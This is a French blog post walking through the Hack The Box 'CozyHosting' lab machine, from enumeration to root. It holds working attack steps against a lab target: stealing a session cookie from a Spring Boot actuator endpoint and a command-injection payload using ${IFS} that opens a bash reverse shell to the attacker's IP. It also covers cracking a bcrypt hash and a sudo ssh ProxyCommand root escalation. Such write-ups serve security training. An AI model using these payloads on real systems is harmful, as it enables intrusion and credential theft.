<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: CozyHosting</title>
<meta name=description content="Platforme: Hack The Box Lien: CozyHosting Niveau: Easy OS: Linux CozyHosting est une machine Linux de niveau facile comportant un site web d&amp;rsquo;hébergement …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/fr/posts/htb-cozyhosting/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: CozyHosting"><meta property="og:description" content="Platforme: Hack The Box Lien: CozyHosting Niveau: Easy OS: Linux CozyHosting est une machine Linux de niveau facile comportant un site web d&amp;rsquo;hébergement …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-CozyHosting/CozyHosting.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-CozyHosting/CozyHosting.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: CozyHosting"><meta name=twitter:description content="Platforme: Hack The Box Lien: CozyHosting Niveau: Easy OS: Linux CozyHosting est une machine Linux de niveau facile comportant un site web d&amp;rsquo;hébergement …"><meta property="twitter:domain" content="https://scorpiosec.com/fr/posts/htb-cozyhosting/"><meta property="twitter:url" content="https://scorpiosec.com/fr/posts/htb-cozyhosting/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-CozyHosting/CozyHosting.png"><link rel=canonical href=https://scorpiosec.com/fr/posts/htb-cozyhosting/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/fr/posts/ aria-label=posts><span data-feather=book></span> Postes</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/projects/ aria-label=projects><span data-feather=code></span> Projets</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/tags/ aria-label=tags><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/categories/ aria-label=categories><span data-feather=folder></span> Catégories</a></div><div class=nav-link><a href=https://scorpiosec.com/ aria-label></a></div><div class="nav-link language-switcher"><a href=/posts/htb-cozyhosting/>English</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/fr/posts/><span data-feather=book></span> Postes</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/projects/><span data-feather=code></span> Projets</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/categories/><span data-feather=folder></span> Catégories</a></li><li class=nav-item><a href=https://scorpiosec.com/></a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: CozyHosting</h1><small role=doc-subtitle></small><p class=post-date>6 min read |
<span class=post-date>2 Mars 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/fr/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platforme: Hack The Box</li><li>Lien: <a href=https://app.hackthebox.com/machines/CozyHosting>CozyHosting</a></li><li>Niveau: Easy</li><li>OS: Linux</li></ul><hr><p>CozyHosting est une machine Linux de niveau facile comportant un site web d&rsquo;hébergement vulnérable à l&rsquo;injection de commandes et l&rsquo;accès au compte root est obtenu en abusant du binaire SSH.</p><p>L&rsquo;adresse IP cible est <code>10.10.11.230</code></p><h2 id=balayage>Balayage</h2><pre tabindex=0><code>sudo nmap -sC -sV -oA nmap/CozyHosting 10.10.11.230
</code></pre><ul><li>Nous avons une machine Linux</li><li>Une application web sur le port 80</li><li>Le service SSH sur le port 22</li></ul><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-02-26 11:21 CST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> cozyhosting.htb <span style=color:#56b6c2>(</span>10.10.11.230<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.046s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>998</span> closed tcp ports <span style=color:#56b6c2>(</span>reset<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 <span style=color:#56b6c2>(</span>Ubuntu Linux; protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>256</span> 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 <span style=color:#56b6c2>(</span>ECDSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#d19a66>256</span> 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 <span style=color:#56b6c2>(</span>ED25519<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>80/tcp open  http    nginx 1.18.0 <span style=color:#56b6c2>(</span>Ubuntu<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-server-header: nginx/1.18.0 <span style=color:#56b6c2>(</span>Ubuntu<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-title: Cozy Hosting - Home
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 9.53 seconds
</span></span></code></pre></div><p>Nous rajoutons <code>10.10.11.230 cozyhosting.htb</code> à fichier <code>/etc/hosts</code> pour faciliter l&rsquo;énumération.</p><h2 id=enumération>Enumération</h2><p>J&rsquo;accède à l&rsquo;application en visitant <code>http://cozyhosting.htb</code>. Il s&rsquo;agit d&rsquo;un service d&rsquo;hébergement, les liens <code>Home</code>, <code>Services</code>, et <code>Pricing</code> ne font rien de spécial.</p><p><img src=/images/HTB-CozyHosting/cozyhosting.png alt=cozyhosting-website></p><p>Le bouton <code>Login</code> vous conduit à une page de connexion avec l&rsquo;url <code>cozyhosting.htb/login</code>.</p><p><img src=/images/HTB-CozyHosting/cozyhosting-login.png alt=cozyhosting-login-form></p><p>Pour commencer, on utilise <code>Gobuster</code> pour trouver tous les répertoires potentiellement cachés, j&rsquo;utilise <a href=https://github.com/danielmiessler/SecLists>SecLists</a>.</p><pre tabindex=0><code>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://cozyhosting.htb
</code></pre><p><img src=/images/HTB-CozyHosting/gobuster-medium.png alt=cozyhosting-Gobuster></p><p><code>/admin</code> et <code>/logout</code> renvoient à la page de connexion. Avec <code>/error</code>, on arrive à une page avec ce message.</p><p><img src=/images/HTB-CozyHosting/whitelabel-error.png alt=cozyhosting-error-page></p><p>Je ne comprends pas ce que signifie cette erreur, je cherche sur Google et je découvre qu&rsquo;il s&rsquo;agit d&rsquo;une erreur de Spring Boot. En lisant plus en détail, j&rsquo;apprends que cette erreur indique que l&rsquo;application Spring Boot n&rsquo;a pas de point de terminaison spécifique ou de route définie pour gérer le chemin <code>/error</code> et qu&rsquo;il pourrait y avoir d&rsquo;autres points de terminaison dans l&rsquo;application.</p><blockquote><p>Consultez cette page stackoverflow <a href=https://stackoverflow.com/questions/31134333/this-application-has-no-explicit-mapping-for-error>Whitelabel Error Page</a> pour plus de détails.</p></blockquote><p>Je reviens à gobuster pour une énumération plus spécifique des répertoires. SecLists a une liste pour Spring Boot que nous pouvons utiliser.</p><pre tabindex=0><code>gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/spring-boot.txt -u http://cozyhosting.htb
</code></pre><p><img src=/images/HTB-CozyHosting/gobuster-springboot.png alt=cozyhosting-Gobuster-spring-boot></p><p>Nous découvrons d&rsquo;autres répertoires, après les avoir tous testés, je trouve ce qui ressemble à un cookie pour l&rsquo;utilisateur <code>kanderson</code> dans <code>/actuator/sessions</code>.</p><p><img src=/images/HTB-CozyHosting/cookie.png alt=cozyhosting-cookie></p><p>Je retourne à la page de connexion et j&rsquo;essaie de l&rsquo;utiliser. J&rsquo;utilise des valeurs aléatoires pour <code>Username</code> et <code>Password</code> pour générer un cookie. Ensuite, je remplace la valeur de mon cookie par celle que je viens de trouver et je rafraîchis la page.</p><p>J&rsquo;ai maintenant accès au tableau de bord de l&rsquo;utilisateur.</p><p><img src=/images/HTB-CozyHosting/Dashboard.png alt=cozyhosting-dashboard></p><p>Il y a un autre champ de saisie, qui semble fonctionner avec des clés SSH.</p><p><img src=/images/HTB-CozyHosting/cozyhosting-SSH-note-1.png alt=cozyhosting-SSH-note></p><p>J&rsquo;utilise Burp Suite pour capturer la requête. J&rsquo;essaie <code>cozyhosting:test</code> et le résultat est le message <code>host key verification failed</code> (échec de la vérification de la clé d&rsquo;hôte). Après avoir entré un <code>hostname</code> et un <code>username</code>, le formulaire envoie une requête au point de terminaison <code>/executessh</code>.</p><p><img src=/images/HTB-CozyHosting/host-key-verification-fail.png alt=cozyhosting-host-key-failure></p><p>Je constate également que l&rsquo;application essaie d&rsquo;exécuter des commandes bash et j&rsquo;obtiens une erreur lorsque <code>/bin/bash -c</code> est exécuté.</p><p><img src=/images/HTB-CozyHosting/binbash-error.png alt=cozyhosting-bash-error></p><h2 id=accès-initial>Accès initial</h2><p>Maintenant que je sais qu&rsquo;une commande bash est exécutée, je peux essayer d&rsquo;obtenir un reverse shell à travers ce processus.</p><p>J&rsquo;ai utilisé cette commande pour générer mon payload en base64.</p><pre tabindex=0><code>echo &#34;bash -i &gt;&amp; /dev/tcp/&lt;your-ip&gt;/&lt;your-port&gt; 0&gt;&amp;1&#34; | base64 -w 0
</code></pre><p><img src=/images/HTB-CozyHosting/payload-generated.png alt=cozyhosting-payload></p><p><strong>Mettre en place un listener netcat avant d&rsquo;essayer de se connecter</strong></p><pre tabindex=0><code>nc -nvlp &lt;YOUR-PORT-NUMBER&gt;
</code></pre><p>J&rsquo;essaie de me connecter avec <code>cozyhosting</code> comme hostname et pour le username j&rsquo;utilise la commande ci-dessous (j&rsquo;utilise mon payload base64 généré plus tôt avec la commande <code>echo</code>)</p><pre tabindex=0><code>echo &#34;YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMjIvODAwMCAwPiYxCg==&#34;
</code></pre><p>J&rsquo;obtiens un message disant <code>Username can't contain whitespaces!</code>. J&rsquo;utilise alors le paramètre bash <code>{IFS%??}</code> pour supprimer les espaces du payload.</p><pre tabindex=0><code>;echo${IFS%??}&#34;&lt;your payload here&gt;&#34;${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
</code></pre><p>Après avoir utilisé le nouveau payload, j&rsquo;obtiens un reverse shell!</p><p><img src=/images/HTB-CozyHosting/rev-shell.png alt=cozyhosting-reverse-shell></p><p>On peut rendre le shell stable à l&rsquo;aide des commandes suivantes</p><pre tabindex=0><code>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;  
export TERM=xterm  
ctrl + z  
stty raw -echo; fg
</code></pre><p><img src=/images/HTB-CozyHosting/stable-shell.png alt=cozyhosting-stable-shell></p><blockquote><p>Ne vous inquiétez pas si vous ne voyez pas le prompt après avoir exécuté la dernière commande, appuyez simplement sur <code>Entrée</code> et le prompt réapparaîtra.</p></blockquote><p>Nous trouvons une archive sur le système cible, téléchargeons-la.</p><p>Je configure un serveur sur le système cible</p><pre tabindex=0><code>python3 -m http.server 8000
</code></pre><p>Sur ma machine Kali, j&rsquo;exécute</p><pre tabindex=0><code>wget cozyhosting.htb:8000/cloudhosting-0.0.1.jar
</code></pre><p>Décompressez l&rsquo;archive avec</p><pre tabindex=0><code>unzip cloudhosting-0.0.1.jar
</code></pre><p>Faites une recherche avec <code>grep -r password *</code> et vous obtiendrez quelques résultats. Je vois qu&rsquo;il y a un mot de passe dans <code>BOOT-INF/classes/application.properties</code>.</p><p><img src=/images/HTB-CozyHosting/password-location-springboot.png alt=cozyhosting-password-in-archive></p><p>J&rsquo;affiche le contenu du fichier sur le terminal et j&rsquo;obtiens un nom d&rsquo;utilisateur en plus du mot de passe pour une base de données PostgreSQL.</p><p><img src=/images/HTB-CozyHosting/postgres-credentials.png alt=cozyhosting-full-credentials></p><p>Je me connecte à PostgreSQL avec</p><pre tabindex=0><code>psql -h 127.0.0.1 -U postgres
</code></pre><p>Puis je me connecte à la base de données avec</p><pre tabindex=0><code>\c cozyhosting
</code></pre><p><img src=/images/HTB-CozyHosting/postgres-loggedin.png alt=cozyhosting-db-login></p><p>Je liste ensuite les tables de la base de données avec <code>\d</code>.</p><p><img src=/images/HTB-CozyHosting/db-tables.png alt=cozyhosting-db-tables></p><p>On exécute ensuite <code>select * from users;</code>, avec cette commande PostgreSQL va récupérer toutes les lignes et toutes les colonnes de la table &ldquo;users&rdquo; et les retourner en tant qu&rsquo;ensemble de résultats. Cette requête est couramment utilisée pour visualiser le contenu d&rsquo;une table et peut être très utile pour inspecter les données stockées dans la base de données.</p><p>Nous trouvons deux hashs</p><p><img src=/images/HTB-CozyHosting/db-hashes.png alt=cozyhosting-db-hashes></p><p>Voyons de quel type de hachage il s&rsquo;agit (bien sûr, nous sommes intéressés par le hachage de l&rsquo;administrateur car nous sommes déjà connectés en tant que kanderson).</p><pre tabindex=0><code>hashid &#39;$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm&#39; 
</code></pre><p><img src=/images/HTB-CozyHosting/hashid.png alt=cozyhosting-hash-ID></p><h3 id=mouvement-latéral>Mouvement Latéral</h3><p>Essayons de craquer le hash. Tout d&rsquo;abord, je l&rsquo;enregistre dans un fichier.</p><pre tabindex=0><code>echo &#39;$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm&#39; &gt; hash.txt
</code></pre><blockquote><p>Si vous ne voulez pas utiliser <code>John</code>, utilisez ce site web <a href=https://hashes.com/en/decrypt/hash>hashes.com</a></p></blockquote><pre tabindex=0><code>john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
</code></pre><p>J&rsquo;obtiens le mot de passe <code>manchesterunited</code>.</p><p>De retour sur le reverse shell, exécutez <code>ls -la /home</code> et vous verrez un autre répertoire appartenant à l&rsquo;utilisateur <code>josh</code>.</p><p><img src=/images/HTB-CozyHosting/home-listing.png alt=cozyhosting-home-content></p><p>On bascule sur l&rsquo;utilisateur <code>josh</code> avec <code>su josh</code> et le mot de passe qu&rsquo;on vient de craquer. On utilise ensuite <code>cd $home</code> pour aller dans son répertoire personnel et on y trouve le drapeau <code>user.txt</code>!</p><p><img src=/images/HTB-CozyHosting/userflag.png alt=cozyhosting-user-flag></p><h2 id=escalade-des-privilèges>Escalade des privilèges</h2><p>J&rsquo;utilise <code>sudo -l</code> pour voir ce que cet utilisateur peut exécuter.</p><p><img src=/images/HTB-CozyHosting/sudo-l-josh.png alt=cozyhosting-sudo-l></p><p>Je vais sur <a href=https://gtfobins.github.io/gtfobins/ssh/#sudo>GTFObins</a> pour trouver des commandes ssh root shells et j&rsquo;utilise</p><pre tabindex=0><code>sudo ssh -o ProxyCommand=&#39;;sh 0&lt;&amp;2 1&gt;&amp;2&#39; x
</code></pre><p><img src=/images/HTB-CozyHosting/priv-escalation.png alt=cozyhosting-privilege-escalation></p><p>Ce shell n&rsquo;est pas optimal, vous pouvez exécuter cette commande pour obtenir un shell plus correct.</p><pre tabindex=0><code>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
</code></pre><p>Il ne vous reste plus qu&rsquo;à faire <code>cd $home</code> et vous trouverez le drapeau <code>root.txt</code>.</p><p><img src=/images/HTB-CozyHosting/rootflag-1.png alt=cozyhosting-privilege-escalation></p><p>Merci d&rsquo;avoir consulté mon article, n&rsquo;hésitez pas à commenter ou à me contacter sur X <a href=https://twitter.com/_KScorpio>@_KScorpio</a> si vous avez des questions.</p></div><div class=prev-next><div class=prev-post><p><a href=/fr/posts/htb-visual/>&#8592;
Précédent:
HTB: Visual</a></p><p class=prev-post-date>février 24, 2024</p></div><div class=next-post><p><a href=/fr/posts/htb-manager/>Suivant:
HTB: Manager
&#8594;</a></p><p class=next-post-date>mars 15, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#balayage>Balayage</a></li><li><a href=#enumération>Enumération</a></li><li><a href=#accès-initial>Accès initial</a><ul><li><a href=#mouvement-latéral>Mouvement Latéral</a></li></ul></li><li><a href=#escalade-des-privilèges>Escalade des privilèges</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>